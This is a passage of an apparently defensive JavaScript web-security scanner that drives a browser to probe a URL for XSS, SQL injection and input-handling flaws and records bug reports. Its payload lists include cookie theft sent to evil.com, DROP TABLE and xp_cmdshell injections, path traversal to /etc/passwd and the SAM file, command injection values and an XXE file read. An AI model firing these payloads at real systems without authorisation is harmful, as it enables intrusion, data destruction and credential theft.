const { v4: uuidv4 } = require('uuid');

/**
 * Security Tests (Defensive - for finding vulnerabilities)
 * - XSS injection detection (30+ payloads, reflected/DOM/stored/encoding bypass)
 * - SQL injection probes (25+ payloads, blind/error-based/db-specific)
 * - Input overflow & fuzzing (20+ payload types, crash/hang/memory detection)
 */

// ── XSS Payloads ──────────────────────────────────────────────────────────────

const XSS_PAYLOADS_REFLECTED = [
  // Script tags
  '<script>alert("XSS")</script>',
  '<script src="https://evil.com/xss.js"></script>',
  '<script>document.location="https://evil.com/?c="+document.cookie</script>',
  // Img onerror
  '<img src=x onerror=alert("XSS")>',
  '<img src=x onerror="fetch(\'https://evil.com\')">',
  // SVG
  '<svg onload=alert("XSS")>',
  '<svg><script>alert("XSS")</script></svg>',
  // Body/iframe
  '<body onload=alert("XSS")>',
  '<iframe srcdoc="<script>alert(1)</script>">',
  '<iframe src="javascript:alert(1)">',
  // Input autofocus
  '<input onfocus=alert("XSS") autofocus>',
  '<input type="text" onfocusin=alert("XSS") autofocus>',
  // Math tags
  '<math><mtext><table><mglyph><svg onload=alert("XSS")>',
  // Event handlers
  '<div onmouseover=alert("XSS")>hover me</div>',
  '<div onmouseenter=alert("XSS")>enter me</div>',
  '<a onclick=alert("XSS")>click me</a>',
  '<marquee onstart=alert("XSS")>',
  '<details open ontoggle=alert("XSS")>',
  '<video><source onerror=alert("XSS")>',
  // CSS expression (IE legacy but still worth testing)
  '<div style="background:url(javascript:alert(1))">',
  '<div style="width:expression(alert(1))">',
];

const XSS_PAYLOADS_DOM = [
  // javascript: protocol
  'javascript:alert("XSS")',
  'javascript:alert(document.domain)',
  'jAvAsCrIpT:alert("XSS")', // mixed case bypass
  // data: URI
  'data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
  'data:text/html,<script>alert("XSS")</script>',
  // Template literal injection
  '${alert("XSS")}',
  '`${alert("XSS")}`',
  // innerHTML sinks
  '<img src=x onerror=this.parentElement.innerHTML="pwned">',
];

const XSS_PAYLOADS_ENCODING_BYPASS = [
  // Double encoding
  '%253Cscript%253Ealert("XSS")%253C/script%253E',
  // Unicode escapes
  '\\u003cscript\\u003ealert("XSS")\\u003c/script\\u003e',
  '\u003cscript\u003ealert("XSS")\u003c/script\u003e',
  // Hex encoding
  '&#x3C;script&#x3E;alert("XSS")&#x3C;/script&#x3E;',
  '&#60;script&#62;alert("XSS")&#60;/script&#62;',
  // Mixed case
  '<ScRiPt>alert("XSS")</ScRiPt>',
  '<IMG SRC=x ONERROR=alert("XSS")>',
  // Null byte injection
  '<scr\x00ipt>alert("XSS")</script>',
  'test\x00<script>alert("XSS")</script>',
  // HTML entity bypass
  '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
];

const XSS_PAYLOADS_CONTEXT = [
  // Inside HTML attributes (break out of quotes)
  '" onmouseover="alert(\'XSS\')" data-x="',
  "' onmouseover='alert(1)' data-x='",
  '" onfocus="alert(1)" autofocus tabindex="0',
  // Inside script blocks
  '</script><script>alert("XSS")</script>',
  '";alert("XSS");//',
  "';alert('XSS');//",
  // Inside style blocks
  '</style><script>alert("XSS")</script>',
  // Inside URL parameters
  '"><script>alert(document.domain)</script>',
];

const ALL_XSS_PAYLOADS = [
  ...XSS_PAYLOADS_REFLECTED,
  ...XSS_PAYLOADS_DOM,
  ...XSS_PAYLOADS_ENCODING_BYPASS,
  ...XSS_PAYLOADS_CONTEXT,
];

// ── SQL Injection Payloads ────────────────────────────────────────────────────

const SQLI_PAYLOADS_CLASSIC = [
  "' OR '1'='1",
  "' OR '1'='1'--",
  "' OR '1'='1'/*",
  '" OR "1"="1',
  '" OR "1"="1"--',
  "1; DROP TABLE users;--",
  "1'; DROP TABLE users;--",
  "' UNION SELECT null--",
  "' UNION SELECT null,null--",
  "' UNION SELECT null,null,null--",
  "' UNION SELECT username,password FROM users--",
  "admin'--",
  "admin' #",
  "1' AND '1'='1",
  "1' AND '1'='2",
  "' OR ''='",
  "1 OR 1=1",
  "1) OR (1=1",
];

const SQLI_PAYLOADS_BLIND = [
  // Time-based blind
  "' OR SLEEP(3)--",
  "'; WAITFOR DELAY '0:0:3'--",
  "' OR pg_sleep(3)--",
  "1; SELECT SLEEP(3);--",
  "1; SELECT pg_sleep(3);--",
  "'; SELECT BENCHMARK(10000000,SHA1('test'));--",
  // Boolean-based blind
  "' AND 1=1--",
  "' AND 1=2--",
  "' AND SUBSTRING(@@version,1,1)='5'--",
  "' AND (SELECT COUNT(*) FROM users)>0--",
];

const SQLI_PAYLOADS_DB_SPECIFIC = [
  // MySQL
  "' AND @@version--",
  "' AND BENCHMARK(5000000,SHA1('test'))--",
  "' UNION SELECT @@version,null--",
  // PostgreSQL
  "'; SELECT version();--",
  "' AND (SELECT version())::text LIKE '%Postgre%'--",
  // MSSQL
  "'; EXEC xp_cmdshell('dir');--",
  "' AND @@SERVERNAME IS NOT NULL--",
  "'; WAITFOR DELAY '0:0:3';--",
  // SQLite
  "' AND sqlite_version()--",
  "' UNION SELECT sql FROM sqlite_master--",
  // Oracle
  "' AND UTL_INADDR.get_host_address('localhost') IS NOT NULL--",
  "' UNION SELECT banner FROM v$version--",
];

const SQLI_PAYLOADS_ERROR_BASED = [
  "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
  "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
  "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
  "CONVERT(int,(SELECT @@version))--",
];

const SQLI_PAYLOADS_NUMERIC = [
  '1+1',
  '2-1',
  '1*1',
  '0/1',
  '1 AND 1=1',
  '1 AND 1=2',
];

const ALL_SQLI_PAYLOADS = [
  ...SQLI_PAYLOADS_CLASSIC,
  ...SQLI_PAYLOADS_BLIND,
  ...SQLI_PAYLOADS_DB_SPECIFIC,
  ...SQLI_PAYLOADS_ERROR_BASED,
  ...SQLI_PAYLOADS_NUMERIC,
];

const SQL_ERROR_PATTERNS = [
  // MySQL
  /you have an error in your sql syntax/i,
  /mysql_fetch/i,
  /mysql_num_rows/i,
  /mysql_query/i,
  /mysqli/i,
  /supplied argument is not a valid mysql/i,
  /com\.mysql\.jdbc/i,
  // PostgreSQL
  /postgresql/i,
  /pg_query/i,
  /pg_exec/i,
  /pg_connect/i,
  /unterminated quoted string at or near/i,
  /syntax error at or near/i,
  /org\.postgresql\.util/i,
  // MSSQL
  /sql server/i,
  /microsoft ole db provider for sql server/i,
  /unclosed quotation mark after the character string/i,
  /mssql_query/i,
  /system\.data\.sqlclient/i,
  // SQLite
  /sqlite3?\.OperationalError/i,
  /sqlite_error/i,
  /sqlite\.exception/i,
  /near ".*": syntax error/i,
  // Oracle
  /ora-\d{4,5}/i,
  /oracle error/i,
  /quoted string not properly terminated/i,
  /oracle\.jdbc/i,
  // JDBC / ODBC
  /jdbc.*exception/i,
  /odbc.*driver/i,
  /odbc.*error/i,
  // Generic SQL
  /sql syntax/i,
  /syntax error.*sql/i,
  /sql command not properly ended/i,
  /invalid column name/i,
  /column .* does not exist/i,
  /table .* doesn't exist/i,
  /unknown column/i,
  // Stack trace indicators
  /stack trace/i,
  /at\s+[\w.$]+\([\w.]+:\d+\)/i,  // Java-style stack trace
  /Traceback \(most recent call last\)/i,  // Python
  /Fatal error/i,
  /Warning:.*\bsql\b/i,
  // Information disclosure
  /server at .* port \d+/i,
  /\/var\/www/i,
  /\/usr\/local/i,
  /c:\\\\inetpub/i,
  /\.php on line \d+/i,
  /\.asp on line \d+/i,
];

// ── Overflow / Fuzzing Payloads ───────────────────────────────────────────────

const OVERFLOW_PAYLOADS = [
  // String overflow
  { name: 'Long string (10K chars)', value: 'A'.repeat(10000) },
  { name: 'Long string (50K chars)', value: 'B'.repeat(50000) },
  { name: 'Long string (100K chars)', value: 'C'.repeat(100000) },
  // Null bytes
  { name: 'Null byte start', value: '\x00test' },
  { name: 'Null byte middle', value: 'test\x00\x00\x00test' },
  { name: 'Null byte end', value: 'test\x00' },
  { name: 'Null bytes throughout', value: 't\x00e\x00s\x00t' },
  // Format strings
  { name: 'Format string %s', value: '%s%s%s%s%s%s%s%s%s%s' },
  { name: 'Format string %n', value: '%n%n%n%n%n%n%n%n%n%n' },
  { name: 'Format string %x', value: '%x%x%x%x%x%x%x%x%x%x' },
  { name: 'Format string %d', value: '%d%d%d%d%d%d%d%d%d%d' },
  { name: 'Format string mixed', value: '%s%n%x%d%p%s%n%x%d%p' },
  // Unicode stress
  { name: 'Combining characters', value: 'A\u0300\u0301\u0302\u0303\u0304\u0305\u0306\u0307\u0308\u0309'.repeat(200) },
  { name: 'RTL override', value: '\u202E\u0645\u0631\u062D\u0628\u0627 Hello World' },
  { name: 'Zero-width joiners', value: 'test\u200D\u200D\u200D\u200D\u200Dtest'.repeat(500) },
  { name: 'Homoglyph characters', value: '\u0410\u0412\u0421\u0415\u041D\u0422\u041E\u0420' }, // Cyrillic lookalikes
  { name: 'Astral plane characters', value: '𝕋𝕖𝕤𝕥'.repeat(1000) },
  { name: 'Emoji storm', value: '😀😃😄😁😆😅🤣😂🙂🙃'.repeat(500) },
  // Special characters (OWASP set)
  { name: 'OWASP special chars', value: '<>"\'&;|`${}[]\\\/!@#%^*()+=~' },
  { name: 'HTML entities', value: '&lt;&gt;&amp;&quot;&#39;&#x2F;&#x60;&#x3D;' },
  // Negative numbers
  { name: 'Negative -1', value: '-1' },
  { name: 'Negative 0', value: '-0' },
  { name: 'Negative large', value: '-999999999999' },
  { name: 'MIN_SAFE_INTEGER', value: '-9007199254740991' },
  // Float precision
  { name: 'Float precision 0.1+0.2', value: '0.30000000000000004' },
  { name: 'Float max', value: '1e308' },
  { name: 'Infinity', value: 'Infinity' },
  { name: 'NaN', value: 'NaN' },
  { name: 'Negative Infinity', value: '-Infinity' },
  { name: 'Very small float', value: '5e-324' },
  // Date edge cases
  { name: 'Date zero', value: '0000-00-00' },
  { name: 'Date far future', value: '9999-12-31' },
  { name: 'Date Y2K38', value: '2038-01-19T03:14:08Z' },
  { name: 'Date epoch 0', value: '1970-01-01T00:00:00Z' },
  { name: 'Date negative epoch', value: '1969-12-31T23:59:59Z' },
  // Path traversal
  { name: 'Path traversal unix', value: '../../../etc/passwd' },
  { name: 'Path traversal encoded', value: '..%2F..%2F..%2Fetc%2Fpasswd' },
  { name: 'Path traversal double dot', value: '....//....//....//etc/passwd' },
  { name: 'Path traversal windows', value: '..\\..\\..\\windows\\system32\\config\\sam' },
  { name: 'Path traversal null byte', value: '../../../etc/passwd\x00.jpg' },
  // Command injection
  { name: 'Command injection semicolon', value: '; ls -la' },
  { name: 'Command injection pipe', value: '| cat /etc/passwd' },
  { name: 'Command injection $() ', value: '$(whoami)' },
  { name: 'Command injection backtick', value: '`whoami`' },
  { name: 'Command injection &&', value: '&& id' },
  { name: 'Command injection newline', value: 'test\nid' },
  // CRLF injection
  { name: 'CRLF injection', value: 'test%0d%0aInjected-Header: true' },
  { name: 'CRLF with body', value: 'test\r\n\r\n<html>injected</html>' },
  // XML/JSON injection
  { name: 'XML entity', value: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' },
  { name: 'JSON nested', value: '{"a":{"b":{"c":{"d":{"e":{"f":{"g":"deep"}}}}}}}' },
  { name: 'JSON array bomb', value: '[[[[[[[[[[[[[[[[[[[[]]]]]]]]]]]]]]]]]]]]' },
  // Buffer patterns
  { name: 'Buffer overflow pattern', value: 'A'.repeat(256) + '%x'.repeat(16) },
  { name: 'Cyclic pattern', value: Array.from({ length: 256 }, (_, i) => String.fromCharCode(65 + (i % 26))).join('') },
];

// ── Helper Functions ──────────────────────────────────────────────────────────

function makeBug(severity, title, testId, description, steps, expected, actual, bugUrl) {
  return {
    id: uuidv4(),
    severity,
    title,
    category: 'Security & Malicious Input',
    testId,
    description,
    stepsToReproduce: steps,
    expected,
    actual,
    url: bugUrl,
    timestamp: new Date().toISOString(),
  };
}

// ── XSS Test ──────────────────────────────────────────────────────────────────

async function runSecXss(page, url, options, broadcast) {
  const bugs = [];
  let dialogDetected = false;
  let dialogMessage = '';

  broadcast({ type: 'log', text: 'Testing for XSS vulnerabilities (30+ payloads)...', color: '#4ECDC4' });

  const dialogHandler = async (dialog) => {
    dialogDetected = true;
    dialogMessage = dialog.message();
    await dialog.dismiss();
  };

  page.on('dialog', dialogHandler);

  try {
    await page.goto(url, { waitUntil: 'domcontentloaded', timeout: (options.timeout || 30) * 1000 });

    // ── Phase 1: Check security headers ──────────────────────────────────────
    broadcast({ type: 'log', text: 'Checking security headers...', color: '#4ECDC4' });

    const response = await page.goto(url, { waitUntil: 'domcontentloaded', timeout: (options.timeout || 30) * 1000 });
    const headers = response ? response.headers() : {};

    // X-XSS-Protection
    const xssProtection = headers['x-xss-protection'];
    if (!xssProtection) {
      bugs.push(makeBug(
        'medium',
        'Missing X-XSS-Protection header',
        'sec_xss_headers',
        'The X-XSS-Protection header is not set. While deprecated in modern browsers in favor of CSP, it still provides a defense-in-depth layer for older browsers.',
        ['Navigate to ' + url, 'Inspect response headers'],
        'X-XSS-Protection: 1; mode=block',
        'Header is missing',
        url
      ));
    } else if (!xssProtection.includes('mode=block')) {
      bugs.push(makeBug(
        'low',
        'X-XSS-Protection not in block mode',
        'sec_xss_headers',
        `X-XSS-Protection is set to "${xssProtection}" but should use mode=block to prevent page rendering on XSS detection.`,
        ['Navigate to ' + url, 'Inspect X-XSS-Protection header'],
        'X-XSS-Protection: 1; mode=block',
        `X-XSS-Protection: ${xssProtection}`,
        url
      ));
    }

    // Content-Security-Policy
    const csp = headers['content-security-policy'];
    if (!csp) {
      bugs.push(makeBug(
        'high',
        'Missing Content-Security-Policy header',
        'sec_xss_csp',
        'No Content-Security-Policy header is set. CSP is the primary defense against XSS attacks. Without it, inline scripts and external script sources are unrestricted.',
        ['Navigate to ' + url, 'Inspect response headers for CSP'],
        'A strict Content-Security-Policy header should be present',
        'CSP header is missing',
        url
      ));
    } else {
      // Check CSP strictness
      const cspIssues = [];
      if (csp.includes("'unsafe-inline'")) cspIssues.push("allows 'unsafe-inline' scripts");
      if (csp.includes("'unsafe-eval'")) cspIssues.push("allows 'unsafe-eval'");
      if (csp.includes('*') && !csp.includes('*.')) cspIssues.push('uses wildcard (*) source');
      if (!csp.includes('default-src') && !csp.includes('script-src')) cspIssues.push('missing script-src or default-src directive');
      if (csp.includes('data:')) cspIssues.push("allows data: URIs which can execute scripts");
      if (!csp.includes('frame-ancestors')) cspIssues.push('missing frame-ancestors (clickjacking protection)');

      if (cspIssues.length > 0) {
        bugs.push(makeBug(
          'medium',
          `Weak Content-Security-Policy (${cspIssues.length} issues)`,
          'sec_xss_csp',
          `CSP is present but has weaknesses:\n- ${cspIssues.join('\n- ')}\n\nCSP value: ${csp.substring(0, 200)}${csp.length > 200 ? '...' : ''}`,
          ['Navigate to ' + url, 'Inspect Content-Security-Policy header'],
          'Strict CSP without unsafe-inline, unsafe-eval, or wildcards',
          `CSP has ${cspIssues.length} weakness(es)`,
          url
        ));
      }
    }

    // X-Content-Type-Options
    const contentTypeOpts = headers['x-content-type-options'];
    if (!contentTypeOpts) {
      bugs.push(makeBug(
        'medium',
        'Missing X-Content-Type-Options header',
        'sec_xss_headers',
        'X-Content-Type-Options is not set. Without "nosniff", browsers may MIME-sniff responses, potentially treating non-script content as executable scripts.',
        ['Navigate to ' + url, 'Inspect response headers'],
        'X-Content-Type-Options: nosniff',
        'Header is missing',
        url
      ));
    }

    // ── Phase 2: URL-based XSS (hash and query params) ──────────────────────
    broadcast({ type: 'log', text: 'Testing URL-based XSS (hash & query params)...', color: '#4ECDC4' });

    const urlXssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert(1)>',
      'javascript:alert(1)',
      '"><script>alert(1)</script>',
    ];

    for (const payload of urlXssPayloads) {
      dialogDetected = false;
      try {
        const encodedPayload = encodeURIComponent(payload);

        // Test via query parameter
        const testUrlQuery = url.includes('?')
          ? `${url}&xss_test=${encodedPayload}`
          : `${url}?xss_test=${encodedPayload}`;
        await page.goto(testUrlQuery, { waitUntil: 'domcontentloaded', timeout: 10000 }).catch(() => {});
        await page.waitForTimeout(500);

        if (dialogDetected) {
          bugs.push(makeBug(
            'critical',
            'URL query parameter XSS vulnerability',
            'sec_xss_url',
            `XSS payload executed via URL query parameter. Dialog message: "${dialogMessage}"`,
            ['Navigate to ' + testUrlQuery],
            'URL parameters should be sanitized before rendering',
            'Script executed from URL parameter',
            testUrlQuery
          ));
          break;
        }

        // Check for unescaped reflection in page
        const content = await page.content();
        if (content.includes(payload)) {
          bugs.push(makeBug(
            'high',
            'URL parameter reflected unescaped in DOM',
            'sec_xss_url',
            'XSS payload from URL query parameter appears unescaped in page DOM, indicating potential reflected XSS.',
            ['Navigate to ' + testUrlQuery, 'View page source'],
            'URL parameters should be HTML-encoded when reflected',
            'Payload appears raw in DOM',
            testUrlQuery
          ));
          break;
        }

        // Test via hash fragment
        dialogDetected = false;
        const testUrlHash = `${url}#${encodedPayload}`;
        await page.goto(testUrlHash, { waitUntil: 'domcontentloaded', timeout: 10000 }).catch(() => {});
        await page.waitForTimeout(500);

        if (dialogDetected) {
          bugs.push(makeBug(
            'critical',
            'URL hash fragment XSS vulnerability',
            'sec_xss_url',
            `XSS payload executed via URL hash fragment. Dialog message: "${dialogMessage}"`,
            ['Navigate to ' + testUrlHash],
            'Hash fragments should be sanitized before rendering',
            'Script executed from hash fragment',
            testUrlHash
          ));
          break;
        }
      } catch (e) {
        // Continue
      }
    }

    // ── Phase 3: Input-based XSS (all payloads) ─────────────────────────────
    await page.goto(url, { waitUntil: 'domcontentloaded', timeout: (options.timeout || 30) * 1000 });

    const inputs = await page.$$('input[type="text"], input[type="search"], input[type="url"], input[type="email"], input:not([type]), textarea, [contenteditable="true"]');
    broadcast({ type: 'log', text: `Found ${inputs.length} text inputs to test with ${ALL_XSS_PAYLOADS.length} payloads`, color: '#4ECDC4' });

    let xssFound = false;

    for (const input of inputs.slice(0, 8)) {
      if (xssFound) break;

      for (const payload of ALL_XSS_PAYLOADS) {
        if (xssFound) break;
        dialogDetected = false;

        try {
          // Determine if it's contenteditable
          const isContentEditable = await input.evaluate(el => el.hasAttribute('contenteditable'));

          await input.click({ timeout: 2000 }).catch(() => {});
          await page.keyboard.selectAll();

          if (isContentEditable) {
            await input.evaluate((el, p) => { el.textContent = ''; el.innerHTML = p; }, payload);
          } else {
            await input.fill('').catch(() => {});
            await input.type(payload, { delay: 5 });
          }

          await page.waitForTimeout(200);

          // Try submitting via Enter
          await page.keyboard.press('Enter').catch(() => {});
          await page.waitForTimeout(500);

          // Check for dialog (script execution)
          if (dialogDetected) {
            xssFound = true;
            bugs.push(makeBug(
              'critical',
              'XSS vulnerability: Script execution detected',
              'sec_xss',
              `XSS payload triggered script execution via dialog. Message: "${dialogMessage}"\nPayload: ${payload}`,
              ['Navigate to ' + url, 'Find text input field', 'Enter payload: ' + payload, 'Submit or blur the field'],
              'Input should be sanitized, no script execution',
              'Script executed and dialog appeared',
              url
            ));
            broadcast({ type: 'log', text: 'CRITICAL: XSS vulnerability found!', color: '#FF2D2D' });
            break;
          }

          // Check for unescaped reflection in DOM
          const content = await page.content();
          if (content.includes(payload) && payload.includes('<') && !payload.startsWith('%')) {
            xssFound = true;
            bugs.push(makeBug(
              'high',
              'Potential XSS: Unescaped input reflection',
              'sec_xss',
              `XSS payload is reflected in the page without proper encoding.\nPayload: ${payload}`,
              ['Navigate to ' + url, 'Enter payload in input', 'View page source'],
              'Input should be HTML-encoded when reflected',
              'Payload appears unencoded in DOM',
              url
            ));
            broadcast({ type: 'log', text: 'Potential XSS: unescaped reflection', color: '#FF6B35' });
            break;
          }

          // Reset page periodically to clear state
          if (ALL_XSS_PAYLOADS.indexOf(payload) % 10 === 9) {
            await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 10000 }).catch(() => {});
          }
        } catch (e) {
          // Input might not be interactive or page navigated, continue
          try {
            await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 10000 });
          } catch (_) {
            // Ignore
          }
        }
      }
    }

    // ── Phase 4: Stored XSS indicator ────────────────────────────────────────
    if (!xssFound) {
      broadcast({ type: 'log', text: 'Checking for stored XSS indicators...', color: '#4ECDC4' });

      try {
        const markerPayload = '<img src=x onerror=alert("STORED_XSS_MARKER_' + Date.now() + '")>';
        const markerText = 'STORED_XSS_MARKER_' + Date.now();

        // Try injecting a marker into the first input
        await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 10000 });
        const firstInput = await page.$('input[type="text"], input:not([type]), textarea');
        if (firstInput) {
          await firstInput.click({ timeout: 2000 }).catch(() => {});
          await firstInput.fill('').catch(() => {});
          await firstInput.type(markerPayload, { delay: 5 });
          await page.keyboard.press('Enter').catch(() => {});
          await page.waitForTimeout(1000);

          // Reload page and check if payload persists
          await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 10000 });
          await page.waitForTimeout(1000);

          const contentAfterReload = await page.content();
          if (contentAfterReload.includes(markerPayload) || contentAfterReload.includes(markerText)) {
            bugs.push(makeBug(
              'critical',
              'Potential stored XSS: Payload persists after reload',
              'sec_xss_stored',
              'An XSS payload entered in an input field persists in the page after reloading, indicating stored/persistent XSS.',
              ['Navigate to ' + url, 'Enter XSS payload in input', 'Submit the form', 'Reload the page', 'Observe payload in page source'],
              'User input should be sanitized before storage and output encoding applied on display',
              'XSS payload persists in page after reload',
              url
            ));
            broadcast({ type: 'log', text: 'CRITICAL: Potential stored XSS detected!', color: '#FF2D2D' });
          }
        }
      } catch (e) {
        // Non-critical
      }
    }

    // ── Phase 5: DOM clobbering check ────────────────────────────────────────
    broadcast({ type: 'log', text: 'Checking for DOM clobbering vulnerabilities...', color: '#4ECDC4' });

    try {
      await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 10000 });
      const clobberResult = await page.evaluate(() => {
        const issues = [];
        // Check if named elements override global properties
        const forms = document.querySelectorAll('form[name], form[id]');
        for (const form of forms) {
          const name = form.name || form.id;
          if (name && window[name] === form) {
            issues.push(`Form "${name}" accessible via window.${name}`);
          }
        }
        const anchors = document.querySelectorAll('a[name], a[id]');
        for (const a of anchors) {
          const name = a.name || a.id;
          if (name && window[name] === a) {
            issues.push(`Anchor "${name}" accessible via window.${name}`);
          }
        }
        // Check for elements with ids that shadow built-in properties
        const dangerousIds = ['location', 'origin', 'domain', 'cookie', 'referrer', 'title'];
        for (const id of dangerousIds) {
          const el = document.getElementById(id);
          if (el) {
            issues.push(`Element with id="${id}" could clobber document.${id}`);
          }
        }
        return issues;
      });

      if (clobberResult.length > 0) {
        bugs.push(makeBug(
          'medium',
          `DOM clobbering risk: ${clobberResult.length} issue(s)`,
          'sec_xss_clobber',
          `DOM clobbering vectors detected. Named elements can override global JavaScript properties, potentially leading to XSS if combined with other vulnerabilities.\n\nIssues:\n- ${clobberResult.join('\n- ')}`,
          ['Navigate to ' + url, 'Open DevTools console', 'Check if form/anchor names shadow global properties'],
          'Elements should not use IDs/names that shadow critical browser globals',
          `${clobberResult.length} DOM clobbering issue(s) found`,
          url
        ));
      }
    } catch (e) {
      // Non-critical
    }

    if (!xssFound && bugs.filter(b => b.testId === 'sec_xss').length === 0) {
      broadcast({ type: 'log', text: 'No XSS execution vulnerabilities detected', color: '#4ECDC4' });
    }

  } catch (error) {
    broadcast({ type: 'log', text: `XSS test error: ${error.message}`, color: '#FF6B35' });
  } finally {
    page.off('dialog', dialogHandler);
  }

  return bugs;
}

// ── SQL Injection Test ────────────────────────────────────────────────────────

async function runSecSqli(page, url, options, broadcast) {
  const bugs = [];

  broadcast({ type: 'log', text: `Testing for SQL injection (${ALL_SQLI_PAYLOADS.length} payloads)...`, color: '#4ECDC4' });

  try {
    await page.goto(url, { waitUntil: 'domcontentloaded', timeout: (options.timeout || 30) * 1000 });

    // ── Phase 1: Capture baseline ────────────────────────────────────────────
    const baselineContent = await page.content();
    const baselineLength = baselineContent.length;

    // ── Phase 2: Find all input targets ──────────────────────────────────────
    const textInputs = await page.$$('input[type="text"], input[type="search"], input[type="email"], input[type="password"], input[type="tel"], input:not([type])');
    const hiddenInputs = await page.$$('input[type="hidden"]');
    const allInputs = [...textInputs, ...hiddenInputs];

    broadcast({ type: 'log', text: `Found ${textInputs.length} visible + ${hiddenInputs.length} hidden inputs`, color: '#4ECDC4' });

    let sqliFound = false;
    let errorBugsCount = 0;

    // ── Phase 3: Test visible inputs ─────────────────────────────────────────
    for (const input of textInputs.slice(0, 6)) {
      if (sqliFound) break;

      for (const payload of ALL_SQLI_PAYLOADS) {
        if (sqliFound) break;

        try {
          await input.click({ timeout: 2000 }).catch(() => {});
          await page.keyboard.selectAll();
          await input.fill('').catch(() => {});
          await input.type(payload, { delay: 5 });

          // Submit
          await page.keyboard.press('Enter').catch(() => {});
          await page.waitForTimeout(1000);

          const responseContent = await page.content();

          // Check for SQL error messages
          for (const pattern of SQL_ERROR_PATTERNS) {
            if (pattern.test(responseContent) && !pattern.test(baselineContent)) {
              sqliFound = true;
              errorBugsCount++;
              bugs.push(makeBug(
                'critical',
                'SQL error message exposed after injection attempt',
                'sec_sqli',
                `SQL-related error message appeared in response after injection payload. This reveals database details and confirms SQL injection vulnerability.\n\nPayload: ${payload}\nMatched pattern: ${pattern.toString()}`,
                ['Navigate to ' + url, 'Enter SQL payload: ' + payload, 'Submit the form', 'Observe error message in response'],
                'No database errors should be exposed to users',
                'SQL error message visible in response',
                url
              ));
              broadcast({ type: 'log', text: 'CRITICAL: SQL error exposed!', color: '#FF2D2D' });
              break;
            }
          }

          if (sqliFound) break;

          // Boolean-based blind detection: check for significant content change
          const responseLength = responseContent.length;
          if (payload.includes("AND '1'='1") || payload.includes('AND 1=1')) {
            // This should return normal results
            const trueLength = responseLength;
            // Now test with false condition
            const falsePayload = payload.replace("'1'='1", "'1'='2").replace('1=1', '1=2');
            await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 10000 }).catch(() => {});
            const falseInput = await page.$('input[type="text"], input:not([type])');
            if (falseInput) {
              await falseInput.click({ timeout: 2000 }).catch(() => {});
              await falseInput.fill('').catch(() => {});
              await falseInput.type(falsePayload, { delay: 5 });
              await page.keyboard.press('Enter').catch(() => {});
              await page.waitForTimeout(1000);
              const falseContent = await page.content();
              const falseLength = falseContent.length;

              // If true/false conditions produce significantly different content, it may be blind SQLi
              if (Math.abs(trueLength - falseLength) > 100 && Math.abs(trueLength - baselineLength) < 200) {
                bugs.push(makeBug(
                  'high',
                  'Potential boolean-based blind SQL injection',
                  'sec_sqli_blind',
                  `Different boolean conditions in SQL payload produce significantly different page content, which may indicate blind SQL injection.\n\nTrue payload: ${payload} (length: ${trueLength})\nFalse payload: ${falsePayload} (length: ${falseLength})\nBaseline length: ${baselineLength}`,
                  ['Navigate to ' + url, 'Enter true-condition SQL payload', 'Compare with false-condition payload', 'Note different response lengths'],
                  'Application should not alter content based on injected SQL conditions',
                  'Response differs based on SQL boolean condition',
                  url
                ));
                broadcast({ type: 'log', text: 'Potential blind SQL injection detected', color: '#FF6B35' });
              }
            }
          }

          // Reset page for next payload
          await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 10000 }).catch(() => {});
        } catch (e) {
          try {
            await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 10000 });
          } catch (_) {
            // Ignore
          }
        }
      }
    }

    // ── Phase 4: Test hidden inputs via JS ───────────────────────────────────
    if (!sqliFound && hiddenInputs.length > 0) {
      broadcast({ type: 'log', text: 'Testing hidden inputs via JavaScript...', color: '#4ECDC4' });

      for (const hidden of hiddenInputs.slice(0, 3)) {
        if (sqliFound) break;

        const testPayloads = SQLI_PAYLOADS_CLASSIC.slice(0, 5);
        for (const payload of testPayloads) {
          try {
            await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 10000 });

            // Modify hidden input value via JS
            await hidden.evaluate((el, p) => { el.value = p; }, payload);

            // Find and submit the closest form
            const submitted = await hidden.evaluate((el) => {
              const form = el.closest('form');
              if (form) { form.submit(); return true; }
              return false;
            });

            if (submitted) {
              await page.waitForTimeout(2000);
              const responseContent = await page.content();

              for (const pattern of SQL_ERROR_PATTERNS) {
                if (pattern.test(responseContent) && !pattern.test(baselineContent)) {
                  sqliFound = true;
                  bugs.push(makeBug(
                    'critical',
                    'SQL injection via hidden form field',
                    'sec_sqli_hidden',
                    `SQL error exposed when modifying a hidden input field. This indicates server-side trust of hidden field values without sanitization.\n\nPayload: ${payload}`,
                    ['Navigate to ' + url, 'Use DevTools to modify hidden input value to: ' + payload, 'Submit the form', 'Observe SQL error in response'],
                    'Hidden fields should be validated server-side like any other input',
                    'SQL error message visible after modifying hidden field',
                    url
                  ));
                  broadcast({ type: 'log', text: 'CRITICAL: SQLi via hidden input!', color: '#FF2D2D' });
                  break;
                }
              }
            }
          } catch (e) {
            // Continue
          }
        }
      }
    }

    // ── Phase 5: URL parameter SQLi ──────────────────────────────────────────
    if (!sqliFound) {
      broadcast({ type: 'log', text: 'Testing URL parameter SQL injection...', color: '#4ECDC4' });

      const urlPayloads = ["' OR '1'='1", "1; DROP TABLE users;--", "' UNION SELECT null--", "' AND SLEEP(3)--"];
      for (const payload of urlPayloads) {
        try {
          const encodedPayload = encodeURIComponent(payload);
          const testUrl = url.includes('?')
            ? `${url}&id=${encodedPayload}&search=${encodedPayload}`
            : `${url}?id=${encodedPayload}&search=${encodedPayload}`;

          await page.goto(testUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
          const responseContent = await page.content();

